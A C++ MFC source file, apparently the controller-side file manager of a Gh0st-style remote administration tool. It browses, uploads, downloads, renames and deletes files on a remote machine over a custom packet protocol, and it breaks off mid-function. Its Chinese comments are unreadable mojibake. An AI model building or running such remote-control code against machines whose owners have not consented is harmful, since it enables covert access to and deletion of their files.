bool CFileManagerDlg::MakeSureDirectoryPathExists(LPCTSTR pszDirPath)    
{
	LPTSTR p, pszDirCopy;
	DWORD dwAttributes;
	__try
	{
		pszDirCopy = (LPTSTR)malloc(sizeof(TCHAR) * (lstrlen(pszDirPath) + 1));

		if(pszDirCopy == NULL)
			return FALSE;

		lstrcpy(pszDirCopy, pszDirPath);

		p = pszDirCopy;

		if((*p == TEXT('\\')) && (*(p+1) == TEXT('\\')))
		{
			p++;          
			p++;           

			while(*p && *p != TEXT('\\'))
			{
				p = CharNext(p);
			}

			if(*p)
			{
				p++;
			}

			while(*p && *p != TEXT('\\'))
			{
				p = CharNext(p);
			}

			if(*p)
			{
				p++;
			}

		}
		else if(*(p+1) == TEXT(':')) 
		{
			p++;
			p++;
			if(*p && (*p == TEXT('\\')))
			{
				p++;
			}
		}

		while(*p)
		{
			if(*p == TEXT('\\'))
			{
				*p = TEXT('\0');
				dwAttributes = GetFileAttributes(pszDirCopy);
				if(dwAttributes == 0xffffffff)
				{
					if(!CreateDirectory(pszDirCopy, NULL))
					{
						if(GetLastError() != ERROR_ALREADY_EXISTS)
						{
							free(pszDirCopy);
							return FALSE;
						}
					}
				}
				else
				{
					if((dwAttributes & FILE_ATTRIBUTE_DIRECTORY) != FILE_ATTRIBUTE_DIRECTORY)
					{
						free(pszDirCopy);
						return FALSE;
					}
				}

				*p = TEXT('\\');
			}

			p = CharNext(p);
		}
	}
	__except(EXCEPTION_EXECUTE_HANDLER)
	{
		free(pszDirCopy);
		return FALSE;
	}

	free(pszDirCopy);
	return TRUE;
}




///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////�����ض˴����ļ������ض�������ļ��Ͳ��뵽�����б�������ļ��о͵ݹ�
bool CFileManagerDlg::FixedUploadDirectory(LPCTSTR lpPathName)      // C: 1.txt  A\2.txt  A\3.txt      C:\1.txt  C;\A\2.txt  C:\A\3.txt
{
	char	lpszFilter[MAX_PATH];
	char	*lpszSlash = NULL;
	memset(lpszFilter, 0, sizeof(lpszFilter));

	if (lpPathName[lstrlen(lpPathName) - 1] != '\\')
		lpszSlash = "\\";
	else
		lpszSlash = "";

	wsprintf(lpszFilter, "%s%s*.*", lpPathName, lpszSlash);


	WIN32_FIND_DATA	wfd;
	HANDLE hFind = FindFirstFile(lpszFilter, &wfd);
	if (hFind == INVALID_HANDLE_VALUE) // ���û���ҵ������ʧ��
		return FALSE;

	do
	{ 
		if (wfd.cFileName[0] == '.') 
			continue; // ����������Ŀ¼ '.'��'..'
		if (wfd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) 
		{ 
			char strDirectory[MAX_PATH];
			wsprintf(strDirectory, "%s%s%s", lpPathName, lpszSlash, wfd.cFileName); 
			FixedUploadDirectory(strDirectory); // ����ҵ�����Ŀ¼��������Ŀ¼���еݹ� 
		} 
		else 
		{ 
			CString file;
			file.Format("%s%s%s", lpPathName, lpszSlash, wfd.cFileName); 
			m_Remote_Upload_Job.AddTail(file);
			// ���ļ����в��� 
		} 
	} while (FindNextFile(hFind, &wfd)); 
	FindClose(hFind); // �رղ��Ҿ��
	return true;
}



void CFileManagerDlg::SendFileData()
{
	FILESIZE *pFileSize = (FILESIZE *)(m_pContext->m_DeCompressionBuffer.GetBuffer(1));
	LONG	dwOffsetHigh = pFileSize->dwSizeHigh ;
	LONG	dwOffsetLow = pFileSize->dwSizeLow;

	m_nCounter = MAKEINT64(pFileSize->dwSizeLow, pFileSize->dwSizeHigh);

	ShowProgress();                        //֪ͨ������


	if (m_nCounter == m_nOperatingFileLength || pFileSize->dwSizeLow == -1 || m_bIsStop)     //pFileSize->dwSizeLow == -1  �ǶԷ�ѡ��������    m_nCounter == m_nOperatingFileLength  ��ɵ�ǰ�Ĵ���
	{
		EndLocalUploadFile();              //�����¸�����Ĵ����������
		return;
	}


	HANDLE	hFile;
	hFile = CreateFile(m_strOperatingFile.GetBuffer(0), GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
	if (hFile == INVALID_HANDLE_VALUE)
	{
		return;
	}

	SetFilePointer(hFile, dwOffsetLow, &dwOffsetHigh, FILE_BEGIN); //8183   4G

	int		nHeadLength = 9; // 1 + 4 + 4  ���ݰ�ͷ����С��Ϊ�̶���9

	DWORD	nNumberOfBytesToRead = MAX_SEND_BUFFER - nHeadLength;  //8192-9
	DWORD	nNumberOfBytesRead = 0;
	BYTE	*lpBuffer = (BYTE *)LocalAlloc(LPTR, MAX_SEND_BUFFER);

	// Token,  ��С��ƫ�ƣ�����

	lpBuffer[0] = COMMAND_FILE_DATA;

	memcpy(lpBuffer + 1, &dwOffsetHigh, sizeof(dwOffsetHigh));
	memcpy(lpBuffer + 5, &dwOffsetLow, sizeof(dwOffsetLow));	

	// ����ֵ
	bool	bRet = true;    //8183   1
	ReadFile(hFile, lpBuffer + nHeadLength, nNumberOfBytesToRead, &nNumberOfBytesRead, NULL);
	CloseHandle(hFile);


	//COMMAND_FILE_DATA 0  0  8183   8183        //1


	if (nNumberOfBytesRead > 0)
	{
		int	nPacketSize = nNumberOfBytesRead + nHeadLength;    //8192
		m_iocpServer->Send(m_pContext, lpBuffer, nPacketSize);  //10
	}
	LocalFree(lpBuffer);
}



void CFileManagerDlg::SendStop()
{
	BYTE	bBuff = COMMAND_STOP;
	m_iocpServer->Send(m_pContext, &bBuff, 1);
}



//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
//���ض�

///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////���ض˵ĸ����������б�
void CFileManagerDlg::FixedRemoteDriveList()
{
	// ����ϵͳͳͼ���б� ����������ͼ���б�
	HIMAGELIST hImageListLarge = NULL;
	HIMAGELIST hImageListSmall = NULL;
	Shell_GetImageLists(&hImageListLarge, &hImageListSmall);
	ListView_SetImageList(m_list_remote.m_hWnd, hImageListLarge, LVSIL_NORMAL);
	ListView_SetImageList(m_list_remote.m_hWnd, hImageListSmall, LVSIL_SMALL);

	m_list_remote.DeleteAllItems();
	// �ؽ�Column
	while(m_list_remote.DeleteColumn(0) != 0);
	m_list_remote.InsertColumn(0, "����",  LVCFMT_LEFT, 200);
	m_list_remote.InsertColumn(1, "����", LVCFMT_LEFT, 100);
	m_list_remote.InsertColumn(2, "�ܴ�С", LVCFMT_LEFT, 100);
	m_list_remote.InsertColumn(3, "���ÿռ�", LVCFMT_LEFT, 115);


	char	*pDrive = NULL;
	pDrive = (char *)m_bRemoteDriveList;   //�Ѿ�ȥ������Ϣͷ��1���ֽ���

	unsigned long		AmntMB = 0; // �ܴ�С
	unsigned long		FreeMB = 0; // ʣ��ռ�
	char				VolName[MAX_PATH];
	char				FileSystem[MAX_PATH];

	/*    //ϵͳ�������� �����������
	6	DRIVE_FLOPPY
	7	DRIVE_REMOVABLE
	8	DRIVE_FIXED
	9	DRIVE_REMOTE
	10	DRIVE_REMOTE_DISCONNECT
	11	DRIVE_CDROM
	*/
	int	nIconIndex = -1;
	//��һ��ѭ���������з���������Ϣ�����ǵ��б���
	for (int i = 0; pDrive[i] != '\0';)   //C Type
	{
		//�����������ж�ͼ�������
		if (pDrive[i] == 'A' || pDrive[i] == 'B')
		{
			nIconIndex = 6;
		}
		else
		{
			switch (pDrive[i + 1])   //�������ж��������� �鿴���ض�
			{
			case DRIVE_REMOVABLE:
				nIconIndex = 7;
				break;
			case DRIVE_FIXED:
				nIconIndex = 8;
				break;
			case DRIVE_REMOTE:
				nIconIndex = 9;
				break;
			case DRIVE_CDROM:
				nIconIndex = 11;
				break;
			default:
				nIconIndex = 8;
				break;		
			}
		}
		//��ʾ��������
		CString	str;
		str.Format("%c:\\", pDrive[i]);  //C Type    c:
		int	nItem = m_list_remote.InsertItem(i, str, nIconIndex);    //Insert   Set
		m_list_remote.SetItemData(nItem, 1);
	    //��ʾ��������С
		memcpy(&AmntMB, pDrive + i + 2, 4);
		memcpy(&FreeMB, pDrive + i + 6, 4);
		str.Format("%10.1f GB", (float)AmntMB / 1024);
		m_list_remote.SetItemText(nItem, 2, str);
		str.Format("%10.1f GB", (float)FreeMB / 1024);
		m_list_remote.SetItemText(nItem, 3, str);
		
		i += 10;

		char	*lpFileSystemName = NULL;
		char	*lpTypeName = NULL;

		lpTypeName = pDrive + i;
		i += lstrlen(pDrive + i) + 1;
		lpFileSystemName = pDrive + i;

		// ��������, Ϊ�վ���ʾ��������
		if (lstrlen(lpFileSystemName) == 0)
		{
			m_list_remote.SetItemText(nItem, 1, lpTypeName);
		}
		else
		{
			m_list_remote.SetItemText(nItem, 1, lpFileSystemName);
		}


		i += lstrlen(pDrive + i) + 1;
	}
	// ����Զ�̵�ǰ·��
	
	m_Remote_Directory_ComboBox.ResetContent();

}

///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////��ListRemote�ؼ��ϵ�˫����Ϣ
void CFileManagerDlg::OnDblclkListRemote(NMHDR *pNMHDR, LRESULT *pResult)
{
	if (m_list_remote.GetSelectedCount() == 0 || m_list_remote.GetItemData(m_list_remote.GetSelectionMark()) != 1)
		return;

	GetRemoteFileList();
	*pResult = 0;
}

///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////��ListRemote�ؼ��ϵ��Ҽ������˵���Ϣ
void CFileManagerDlg::OnNMRClickListRemote(NMHDR *pNMHDR, LRESULT *pResult)
{
	LPNMITEMACTIVATE pNMItemActivate = reinterpret_cast<LPNMITEMACTIVATE>(pNMHDR);
	int	nRemoteOpenMenuIndex = 5;
	CListCtrl	*pListCtrl = &m_list_remote;
	CMenu	popup;
	popup.LoadMenu(IDR_FILEMANAGER);
	CMenu*	pM = popup.GetSubMenu(0);
	CPoint	p;
	GetCursorPos(&p);
	pM->DeleteMenu(IDM_LOCAL_OPEN, MF_BYCOMMAND);
	if (pListCtrl->GetSelectedCount() == 0)
	{
		int	count = pM->GetMenuItemCount();
		for (int i = 0; i < count; i++)
		{
			pM->EnableMenuItem(i, MF_BYPOSITION | MF_GRAYED);
		}
	}
	if (pListCtrl->GetSelectedCount() <= 1)
	{
		pM->EnableMenuItem(IDM_NEWFOLDER, MF_BYCOMMAND | MF_ENABLED);
	}
	if (pListCtrl->GetSelectedCount() == 1)
	{
		// ���ļ���
		if (pListCtrl->GetItemData(pListCtrl->GetSelectionMark()) == 1)
			pM->EnableMenuItem(nRemoteOpenMenuIndex, MF_BYPOSITION| MF_GRAYED);    //xian    yin
		else
			pM->EnableMenuItem(nRemoteOpenMenuIndex, MF_BYPOSITION | MF_ENABLED);
	}
	else
		pM->EnableMenuItem(nRemoteOpenMenuIndex, MF_BYPOSITION | MF_GRAYED);


	pM->EnableMenuItem(IDM_REFRESH, MF_BYCOMMAND | MF_ENABLED);
	pM->TrackPopupMenu(TPM_LEFTALIGN, p.x, p.y, this);	
	*pResult = 0;
}

///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////��ListRemote�������������Ϣ
void CFileManagerDlg::OnLvnEndlabeleditListRemote(NMHDR *pNMHDR, LRESULT *pResult)    //������
{
	NMLVDISPINFO *pDispInfo = reinterpret_cast<NMLVDISPINFO*>(pNMHDR);

	CString str, strExistingFileName, strNewFileName;
	m_list_remote.GetEditControl()->GetWindowText(str);

	strExistingFileName = m_Remote_Path + m_list_remote.GetItemText(pDispInfo->item.iItem, 0);
	strNewFileName = m_Remote_Path + str;

	if (strExistingFileName != strNewFileName)
	{
		UINT nPacketSize = strExistingFileName.GetLength() + strNewFileName.GetLength() + 3;
		LPBYTE lpBuffer = (LPBYTE)LocalAlloc(LPTR, nPacketSize);
		lpBuffer[0] = COMMAND_RENAME_FILE;                                                                   //�򱻿ض˷�����Ϣ
		memcpy(lpBuffer + 1, strExistingFileName.GetBuffer(0), strExistingFileName.GetLength() + 1);
		memcpy(lpBuffer + 2 + strExistingFileName.GetLength(), 
			strNewFileName.GetBuffer(0), strNewFileName.GetLength() + 1);
		m_iocpServer->Send(m_pContext, lpBuffer, nPacketSize);
		LocalFree(lpBuffer);
	}
	*pResult = 1;
}

///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////���ض��ļ��б�
void CFileManagerDlg::FixedRemoteFileList(BYTE *pbBuffer, DWORD dwBufferLen)
{
	// ��������ImageList
	SHFILEINFO	sfi;
	HIMAGELIST hImageListLarge = (HIMAGELIST)SHGetFileInfo(NULL, 0, &sfi,sizeof(SHFILEINFO), SHGFI_SYSICONINDEX | SHGFI_LARGEICON);
	HIMAGELIST hImageListSmall = (HIMAGELIST)SHGetFileInfo(NULL, 0, &sfi,sizeof(SHFILEINFO), SHGFI_SYSICONINDEX | SHGFI_SMALLICON);
	ListView_SetImageList(m_list_remote.m_hWnd, hImageListLarge, LVSIL_NORMAL);
	ListView_SetImageList(m_list_remote.m_hWnd, hImageListSmall, LVSIL_SMALL);

	// �ؽ�����
	m_list_remote.DeleteAllItems();
	while(m_list_remote.DeleteColumn(0) != 0);
	m_list_remote.InsertColumn(0, "����",  LVCFMT_LEFT, 200);
	m_list_remote.InsertColumn(1, "��С", LVCFMT_LEFT, 100);
	m_list_remote.InsertColumn(2, "����", LVCFMT_LEFT, 100);
	m_list_remote.InsertColumn(3, "�޸�����", LVCFMT_LEFT, 115);


	int	nItemIndex = 0;
	m_list_remote.SetItemData
		(
		m_list_remote.InsertItem(nItemIndex++, "..", GetIconIndex(NULL, FILE_ATTRIBUTE_DIRECTORY)),
		1
		);
	/*
	ListView ������˸
	��������ǰ��SetRedraw(FALSE)   
	���º����SetRedraw(TRUE)
	*/
	m_list_remote.SetRedraw(FALSE);

	if (dwBufferLen != 0)
	{
		// ������������������ʾ���б���
		for (int i = 0; i < 2; i++)
		{
			// ����Token����5�ֽ�
			char *pList = (char *)(pbBuffer + 1);			
			for(char *pBase = pList; pList - pBase < dwBufferLen - 1;)
			{
				char	*pszFileName = NULL;
				DWORD	dwFileSizeHigh = 0; // �ļ����ֽڴ�С
				DWORD	dwFileSizeLow = 0;  // �ļ����ֽڴ�С
				int		nItem = 0;
				bool	bIsInsert = false;
				FILETIME	ftm_strReceiveLocalFileTime;

				int	nType = *pList ? FILE_ATTRIBUTE_DIRECTORY : FILE_ATTRIBUTE_NORMAL;
				// i Ϊ 0 ʱ����Ŀ¼��iΪ1ʱ���ļ�
				bIsInsert = !(nType == FILE_ATTRIBUTE_DIRECTORY) == i;
				pszFileName = ++pList;

				if (bIsInsert)
				{
					nItem = m_list_remote.InsertItem(nItemIndex++, pszFileName, GetIconIndex(pszFileName, nType));
					m_list_remote.SetItemData(nItem, nType == FILE_ATTRIBUTE_DIRECTORY);
					SHFILEINFO	sfi;
					SHGetFileInfo(pszFileName, FILE_ATTRIBUTE_NORMAL | nType, &sfi,sizeof(SHFILEINFO), SHGFI_TYPENAME | SHGFI_USEFILEATTRIBUTES);   
					m_list_remote.SetItemText(nItem, 2, sfi.szTypeName);
				}

				// �õ��ļ���С
				pList += lstrlen(pszFileName) + 1;
				if (bIsInsert)
				{
					memcpy(&dwFileSizeHigh, pList, 4);
					memcpy(&dwFileSizeLow, pList + 4, 4);
					CString strSize;
					strSize.Format("%10d KB", (dwFileSizeHigh * (MAXDWORD+1)) / 1024 + dwFileSizeLow / 1024 + (dwFileSizeLow % 1024 ? 1 : 0));
					m_list_remote.SetItemText(nItem, 1, strSize);
					memcpy(&ftm_strReceiveLocalFileTime, pList + 8, sizeof(FILETIME));
					CTime	time(ftm_strReceiveLocalFileTime);
					m_list_remote.SetItemText(nItem, 3, time.Format("%Y-%m-%d %H:%M"));	
				}
				pList += 16;
			}
		}
	}

	m_list_remote.SetRedraw(TRUE);
	// �ָ�����
	m_list_remote.EnableWindow(TRUE);
}



///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////�ӱ��ض˴����ļ������ض˴����ļ�
void CFileManagerDlg::CreateLocalRecvFile()
{
	// ���ü�����
	m_nCounter = 0;

	CString	strDestDirectory = m_Local_Path;   //Com_Box  
	// �������Ҳ��ѡ�񣬵���Ŀ���ļ���
	int nItem = m_list_local.GetSelectionMark();

	// ���ļ���
	if (nItem != -1 && m_list_local.GetItemData(nItem) == 1)
	{
		strDestDirectory += m_list_local.GetItemText(nItem, 0) + "\\";
	}

	if (!m_hCopyDestFolder.IsEmpty())
	{
		strDestDirectory += m_hCopyDestFolder + "\\";
	}

	FILESIZE	*pFileSize = (FILESIZE *)(m_pContext->m_DeCompressionBuffer.GetBuffer(1));
	DWORD	dwSizeHigh = pFileSize->dwSizeHigh;
	DWORD	dwSizeLow = pFileSize->dwSizeLow;

	m_nOperatingFileLength = (dwSizeHigh * (MAXDWORD+1)) + dwSizeLow;

	// ��ǰ���������ļ���
	m_strOperatingFile = m_pContext->m_DeCompressionBuffer.GetBuffer(9);

	m_strReceiveLocalFile = m_strOperatingFile;

	// �õ�Ҫ���浽�ı��ص��ļ�·��
	m_strReceiveLocalFile.Replace(m_Remote_Path, strDestDirectory);   //D:\HelloWorld     C:\HelloWorld    D:\HelloWorld

	// �������Ŀ¼
	MakeSureDirectoryPathExists(m_strReceiveLocalFile.GetBuffer(0));


	WIN32_FIND_DATA FindFileData;
	HANDLE hFind = FindFirstFile(m_strReceiveLocalFile.GetBuffer(0), &FindFileData);    //1.txt


	//5  jmpAll  jmp  (-1)                over  overAll  ()  -->Dlg   Dlg  Dlg






	//�ж��ļ��Ƿ���� �������������ʲô
	if (hFind != INVALID_HANDLE_VALUE
		&& m_nTransferMode != TRANSFER_MODE_OVERWRITE_ALL 
		&& m_nTransferMode != TRANSFER_MODE_JUMP_ALL
		)
	{

		CFileTransferModeDlg	dlg(this);
		dlg.m_strFileName = m_strReceiveLocalFile;
		//������ش��ڸ�ͬ���ļ�ʱ�Ĵ���
		switch (dlg.DoModal())
		{
		case IDC_OVERWRITE:
			m_nTransferMode = TRANSFER_MODE_OVERWRITE;
			break;
		case IDC_OVERWRITE_ALL:
			m_nTransferMode = TRANSFER_MODE_OVERWRITE_ALL;
			break;
		case IDC_JUMP:
			m_nTransferMode = TRANSFER_MODE_JUMP;
			break;
		case IDC_JUMP_ALL:
			m_nTransferMode = TRANSFER_MODE_JUMP_ALL;
			break;
		case IDCANCEL:
			m_nTransferMode = TRANSFER_MODE_CANCEL;
			break;
		}
	}


	if (m_nTransferMode == TRANSFER_MODE_CANCEL)
	{
		// ȡ������
		m_bIsStop = true;
		SendStop();

		Sleep(10);

		return;
	}
	int	nTransferMode;
	switch (m_nTransferMode)
	{
	case TRANSFER_MODE_OVERWRITE_ALL:
		nTransferMode = TRANSFER_MODE_OVERWRITE;
		break;
	case TRANSFER_MODE_JUMP_ALL:
		nTransferMode = TRANSFER_MODE_JUMP;
		break;
	default:
		nTransferMode = m_nTransferMode;
	}

	//�õ��ļ���С
	//1�ֽ�Token,���ֽ�ƫ�Ƹ���λ�����ֽ�ƫ�Ƶ���λ
	BYTE	bToken[9];
	DWORD	dwCreationDisposition; // �ļ��򿪷�ʽ 
	memset(bToken, 0, sizeof(bToken));
	bToken[0] = COMMAND_CONTINUE;          //Ҫ���͵�����ͷ

	// �ļ��Ѿ�����
	if (hFind != INVALID_HANDLE_VALUE)
	{

		// ����
		if (nTransferMode == TRANSFER_MODE_OVERWRITE)
		{
			// ƫ����0
			memset(bToken + 1, 0, 8);
			// ���´���
			dwCreationDisposition = CREATE_ALWAYS;   

		}
		// ������ָ���Ƶ�-1
		else if (nTransferMode == TRANSFER_MODE_JUMP)
		{
			m_ProgressCtrl->SetPos(100);
			DWORD dwOffset = -1;
			memcpy(bToken + 5, &dwOffset, 4);
			dwCreationDisposition = OPEN_EXISTING;
		}
	}
	else
	{
		// ƫ����0
		memset(bToken + 1, 0, 8);
		// ���´���
		dwCreationDisposition = CREATE_ALWAYS;
	}
	FindClose(hFind);

	//�����ļ�
	HANDLE	hFile = 
		CreateFile
		(
		m_strReceiveLocalFile.GetBuffer(0), 
		GENERIC_WRITE,
		FILE_SHARE_WRITE,
		NULL,
		dwCreationDisposition,
		FILE_ATTRIBUTE_NORMAL,
		0
		);
	// ��Ҫ������
	if (hFile == INVALID_HANDLE_VALUE)
	{
		m_nOperatingFileLength = 0;
		m_nCounter = 0;
		::MessageBox(m_hWnd, m_strReceiveLocalFile + " �ļ�����ʧ��", "����", MB_OK|MB_ICONWARNING);
		return;
	}
	CloseHandle(hFile);

	ShowProgress();
	if (m_bIsStop)
		SendStop();
	else
	{
		// ���ͼ��������ļ���token,�����ļ�������ƫ�� ���������COMMAND_CONTINUE
		m_iocpServer->Send(m_pContext, bToken, sizeof(bToken));
	}
}


///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////�ӱ��ض˴����ļ������ض˵�ǰ�ļ��ļ��Ѿ��������
void CFileManagerDlg::EndLocalRecvFile()   
{
	m_nCounter = 0;
	m_strOperatingFile = "";
	m_nOperatingFileLength = 0;

	if (m_Remote_Download_Job.IsEmpty() || m_bIsStop)
	{
		m_Remote_Download_Job.RemoveAll();
		m_bIsStop = false;
		// ���ô��䷽ʽ
		m_nTransferMode = TRANSFER_MODE_NORMAL;	
		EnableControl(TRUE);
		FixedLocalFileList(".");

		m_ProgressCtrl->SetPos(0);
		
	}
	else
	{
	
		Sleep(5);
		SendDownloadJob();
	}
	return;
}
///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////�ӱ��ض˴����ļ������ض˽�����д���ļ�
void CFileManagerDlg::WriteLocalRecvFile()
{

	// �������
	BYTE	*pData;
	DWORD	dwBytesToWrite;
	DWORD	dwBytesWrite;
	int		nHeadLength = 9; // 1 + 4 + 4  ���ݰ�ͷ����С��Ϊ�̶���9
	FILESIZE	*pFileSize;
	// �õ����ݵ�ƫ��
	pData = m_pContext->m_DeCompressionBuffer.GetBuffer(nHeadLength);

	pFileSize = (FILESIZE *)m_pContext->m_DeCompressionBuffer.GetBuffer(1);
	// �õ��������ļ��е�ƫ��, ��ֵ��������
	m_nCounter = MAKEINT64(pFileSize->dwSizeLow, pFileSize->dwSizeHigh);

	LONG	dwOffsetHigh = pFileSize->dwSizeHigh;
	LONG	dwOffsetLow = pFileSize->dwSizeLow;


	dwBytesToWrite = m_pContext->m_DeCompressionBuffer.GetBufferLen() - nHeadLength;

	//���ļ�
	HANDLE	hFile = 
		CreateFile
		(
		m_strReceiveLocalFile.GetBuffer(0), 
		GENERIC_WRITE,
		FILE_SHARE_WRITE,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_NORMAL,
		0
		);

	//ָ���ļ�ƫ�� �����ƫ����ÿ�����ݴ�С���ۼ�
	SetFilePointer(hFile, dwOffsetLow, &dwOffsetHigh, FILE_BEGIN);

	int nRet = 0;
	int i;
	//д���ļ�
	for ( i = 0; i < MAX_WRITE_RETRY; i++)
	{
		// д���ļ�
		nRet = WriteFile
			(
			hFile,
			pData, 
			dwBytesToWrite, 
			&dwBytesWrite,
			NULL
			);
		if (nRet > 0)
		{
			break;
		}
	}

	if (i == MAX_WRITE_RETRY && nRet <= 0)
	{
		::MessageBox(m_hWnd, m_strReceiveLocalFile + " �ļ�д��ʧ��", "����", MB_OK|MB_ICONWARNING);
	}
	CloseHandle(hFile);
	// Ϊ�˱Ƚϣ�����������
	m_nCounter += dwBytesWrite;
	ShowProgress();
	if (m_bIsStop)
		SendStop();
	else
	{
		BYTE	bToken[9];
		bToken[0] = COMMAND_CONTINUE;
		dwOffsetLow += dwBytesWrite;       //��������ļ�ָ����Ǹ�ƫ�ƶ��ˣ�ÿ�εݼ�
		memcpy(bToken + 1, &dwOffsetHigh, sizeof(dwOffsetHigh));
		memcpy(bToken + 5, &dwOffsetLow, sizeof(dwOffsetLow));
		m_iocpServer->Send(m_pContext, bToken, sizeof(bToken));
	}

	
}









void CFileManagerDlg::GetRemoteFileList(CString directory)   //NULL   ..  .
{
	if (directory.GetLength() == 0)
	{
		int	nItem = m_list_remote.GetSelectionMark();

		// �����ѡ�еģ���Ŀ¼
		if (nItem != -1)
		{
			if (m_list_remote.GetItemData(nItem) == 1)
			{
				directory = m_list_remote.GetItemText(nItem, 0);
			}
		}
		// ����Ͽ���õ�·��    // 
		else
		{
			m_Remote_Directory_ComboBox.GetWindowText(m_Remote_Path);  //m_Remote_Path
		}
	}
	// �õ���Ŀ¼
	if (directory == "..")
	{
		m_Remote_Path = GetParentDirectory(m_Remote_Path);
	}
	else if (directory != ".")
	{	
		m_Remote_Path += directory;   
		if(m_Remote_Path.Right(1) != "\\")
			m_Remote_Path += "\\";
	}

	// ���������ĸ�Ŀ¼,���ش����б�
	if (m_Remote_Path.GetLength() == 0)
	{
		FixedRemoteDriveList();   //1024
		return;
	}

	// ��������ǰ��ջ�����

	int	PacketSize = m_Remote_Path.GetLength() + 2;
	BYTE	*bPacket = (BYTE *)LocalAlloc(LPTR, PacketSize);   //D:\
	//��COMMAND_LIST_FILES  ���͵����ƶˣ�����������
	bPacket[0] = COMMAND_LIST_FILES;
	memcpy(bPacket + 1, m_Remote_Path.GetBuffer(0), PacketSize - 1);
	m_iocpServer->Send(m_pContext, bPacket, PacketSize);
	LocalFree(bPacket);

	m_Remote_Directory_ComboBox.InsertString(0, m_Remote_Path);   
	m_Remote_Directory_ComboBox.SetCurSel(0);

	// �õ���������ǰ������
	m_list_remote.EnableWindow(FALSE);  //true   ark 
	m_ProgressCtrl->SetPos(0);   //������
}







void CFileManagerDlg::OnRemoteBigicon()
{
	m_list_remote.ModifyStyle(LVS_TYPEMASK, LVS_ICON);	
}


void CFileManagerDlg::OnRemoteSmallicon()
{
	m_list_remote.ModifyStyle(LVS_TYPEMASK, LVS_SMALLICON);	
}


void CFileManagerDlg::OnRemoteList()
{
	m_list_remote.ModifyStyle(LVS_TYPEMASK, LVS_LIST);
}


void CFileManagerDlg::OnRemoteReport()
{
	m_list_remote.ModifyStyle(LVS_TYPEMASK, LVS_REPORT);	
}








void CFileManagerDlg::OnIdtRemotePrev()                                                  //��ʷ����ϲ�Ŀ¼
{
	GetRemoteFileList("..");
}




void CFileManagerDlg::OnIdtRemoteDelete()                                                //��ʲ˵���ɾ������
{
	m_bIsUpload = false;
	
	CString str;
	if (m_list_remote.GetSelectedCount() > 1)
		str.Format("ȷ��Ҫ���� %d ��ɾ����?", m_list_remote.GetSelectedCount());
	else
	{
		CString file = m_list_remote.GetItemText(m_list_remote.GetSelectionMark(), 0);

		int a = m_list_remote.GetSelectionMark();

		if (a==-1)
		{
			return;
		}
		if (m_list_remote.GetItemData(a) == 1)
			str.Format("ȷʵҪɾ���ļ��С�%s��������������ɾ����?", file);
		else
			str.Format("ȷʵҪ�ѡ�%s��ɾ����?", file);
	}
	if (::MessageBox(m_hWnd, str, "ȷ��ɾ��", MB_YESNO|MB_ICONQUESTION) == IDNO)
		return;
	m_Remote_Delete_Job.RemoveAll();
	POSITION pos = m_list_remote.GetFirstSelectedItemPosition();
	while(pos)
	{
		int nItem = m_list_remote.GetNextSelectedItem(pos);                 //���û�ѡ���ж����ɾ�� ����Ҫ��Ҫɾ���Ķ���ά�������ݽṹ�н��з���
		CString	file = m_Remote_Path + m_list_remote.GetItemText(nItem, 0);
		// �����Ŀ¼
		if (m_list_remote.GetItemData(nItem))   //�� �ļ���   �� �ļ�     // C:\Hello\1.txt C:\Hello\
			file += '\\';

		m_Remote_Delete_Job.AddTail(file);   //ģ������  
	}

	EnableControl(FALSE);

	SendDeleteJob();                      //����ɾ����һ��������
}

// ����һ��ɾ������
BOOL CFileManagerDlg::SendDeleteJob()
{
	if (m_Remote_Delete_Job.IsEmpty())
		return FALSE;
	// ������һ��ɾ����������
	CString file = m_Remote_Delete_Job.GetHead();   //C:\Hello\2.txt
	int		nPacketSize = file.GetLength() + 2;
	BYTE	*bPacket = (BYTE *)LocalAlloc(LPTR, nPacketSize);

	if (file.GetAt(file.GetLength() - 1) == '\\')    //����һ������ �����ַ�
	{
		
		bPacket[0] = COMMAND_DELETE_DIRECTORY;
	}
	else
	{
		
		bPacket[0] = COMMAND_DELETE_FILE;
	}
	// �ļ�ƫ�ƣ�����ʱ��
	memcpy(bPacket + 1, file.GetBuffer(0), nPacketSize - 1);   //COMMAND_DELETE_DIRECTORY:\hello\2.txt
	m_iocpServer->Send(m_pContext, bPacket, nPacketSize);

	LocalFree(bPacket);
	// ��ɾ�������б���ɾ���Լ�
	m_Remote_Delete_Job.RemoveHead();  //
	return TRUE;
}


void CFileManagerDlg::EndRemoteDeleteFile()                     //ɾ����һ������������еĻ�
{
	if (m_Remote_Delete_Job.IsEmpty() || m_bIsStop)
	{
		m_bIsStop = false;
		EnableControl(TRUE);
		GetRemoteFileList(".");


	}
	else
	{
		//sleep�»����,������ǰ�����ݻ�ûsend��ȥ
		Sleep(5);
		SendDeleteJob();
	}
	return;
}


void CFileManagerDlg::OnIdtRemoteNewfolder()                   //��ʲ˵�������ļ��й���
{
	if (m_Remote_Path == "")
		return;
	
	CInputDialog	dlg;

	if (dlg.DoModal() == IDOK && dlg.m_str.GetLength())
	{
		CString file = m_Remote_Path + dlg.m_str + "\\";
		UINT	nPacketSize = file.GetLength() + 2;
		// �������Ŀ¼
		LPBYTE	lpBuffer = (LPBYTE)LocalAlloc(LPTR, file.GetLength() + 2);
		lpBuffer[0] = COMMAND_CREATE_FOLDER;
		memcpy(lpBuffer + 1, file.GetBuffer(0), nPacketSize - 1);
		m_iocpServer->Send(m_pContext, lpBuffer, nPacketSize);
	}
}



void CFileManagerDlg::OnIdtRemoteStop()                       //��ʲ˵���Stop����
{
	 m_bIsStop = true;
}


void CFileManagerDlg::OnIdtRemoteCopy()                       //��ʲ˵��Ĵ����ļ������ض�
{
	m_bIsUpload = false;
	// �����ļ�������
